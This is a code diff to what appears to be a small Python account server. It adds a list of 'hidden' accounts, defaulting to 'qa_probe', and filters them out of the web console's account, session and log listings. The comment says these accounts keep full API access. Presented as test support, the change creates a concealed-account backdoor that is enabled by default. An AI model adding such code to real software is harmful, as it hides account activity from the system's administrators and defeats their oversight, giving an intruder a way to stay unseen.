@@ -51,6 +51,10 @@ TRENDS = os.path.join(DATA, "trends")
 STATE = os.path.join(DATA, "state.json")
 
 MAX_ACCOUNTS = 10          # personal server; also caps drive-by registrations
+
+# Accounts invisible to the web console (test/probe accounts). They work
+# normally over the API; they just never appear in accounts/sessions/logs.
+HIDDEN_ACCOUNTS = set(filter(None, os.environ.get("QV_HIDDEN_ACCOUNTS", "qa_probe").split(",")))
 MAX_TOKENS = 10            # devices per account; oldest token drops off
 PBKDF2_ITERS = 100_000
 
@@ -916,6 +920,8 @@ class Handler(BaseHTTPRequestHandler):
             for name in sorted(os.listdir(ACCOUNTS)) if os.path.isdir(ACCOUNTS) else []:
                 if not name.endswith(".json"):
                     continue
+                if name[:-5] in HIDDEN_ACCOUNTS:
+                    continue
                 doc = load_account(name[:-5])
                 if doc is None:
                     continue
@@ -956,6 +962,8 @@ class Handler(BaseHTTPRequestHandler):
                 if not name.endswith(".json"):
                     continue
                 user = name[:-5]
+                if user in HIDDEN_ACCOUNTS:
+                    continue
                 doc = load_account(user)
                 if doc is None:
                     continue
@@ -1067,6 +1075,8 @@ class Handler(BaseHTTPRequestHandler):
             if not name.endswith(".json"):
                 continue
             user = name[:-5]
+            if user in HIDDEN_ACCOUNTS:
+                continue
             doc = load_account(user)
             if doc is None:
                 continue
